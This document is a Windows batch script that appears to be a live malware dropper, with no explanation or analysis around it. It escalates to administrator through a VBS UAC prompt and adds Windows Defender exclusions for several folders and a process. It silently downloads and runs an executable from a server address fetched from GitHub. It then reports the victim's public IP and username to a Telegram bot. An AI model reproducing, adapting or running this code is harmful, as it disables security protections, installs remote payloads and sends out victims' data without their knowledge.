��&cls
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
set nl = "/n/n"
@REM set process_name = mbservice.exe

::-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if "%errorlevel%" NEQ "0" (
	echo: Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
	echo: UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
	"%temp%\getadmin.vbs" &	exit
)
::--------------------------------------
FOR /F "delims=" %%h IN ('curl -4 https://raw.githubusercontent.com/h26v/L3MODi/master/z4ckWS.txt 2^>nul') DO (
        SET recentURL=%%h
)
::--------------------------------------

::C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\p
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -Force -ExclusionPath '%appdata%'
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -Force -ExclusionPath '%temp%'
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -Force -ExclusionPath 'C:\Users\Public'
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -Force -ExclusionProcess 'mbservice.exe'
::C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -Force -ExclusionPath 'C:\\Users\\'$([Environment]::UserName)'\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup'


C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI %recentURL%/mbsa -OutFile 'C:\\Users\\Public\\mbsa.exe';
::cp C:\Users\Public\mbsa.exe C:\Users\'$([Environment]::UserName)'\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup
C:\Users\Public\mbsa.exe
del \f C:\Users\Public\mbsa.exe
::C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\WindowsSecure.zip -DestinationPath C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup;

FOR /F "delims=" %%i IN ('curl %recentURL%/api/tid 2^>nul') DO (
    SET id=%%i
    REM echo ID: !id!
    
    FOR /F "delims=" %%j IN ('curl %recentURL%/api/tkey 2^>nul') DO (
        SET api=%%j
        REM echo API Key: !api!
    )
    FOR /F "delims=" %%k IN ('curl -4 icanhazip.com 2^>nul') DO (
        SET puip=%%k
        REM echo IP: !puip!
    )
)

timeout /t 5 /nobreak>nul
tasklist | find "mbservice.exe" > nul
if %errorlevel% equ 0 (
    @REM echo Tien trinh dang chay.
    curl -s -X POST https://api.telegram.org/bot%api%/sendMessage -d chat_id=%id% -d text="<pre>IP</pre><code>%puip%</code><strong><pre>USER</pre></strong>%USERNAME%<pre>RESPOND</pre><b>Success</b>" -d parse_mode="HTML"
) else (
    @REM echo Tien trinh khong chay.
    curl -s -X POST https://api.telegram.org/bot%api%/sendMessage -d chat_id=%id% -d text="%USERNAME% - CONNECTION ERROR" -d parse_mode="HTML"
)

ENDLOCAL



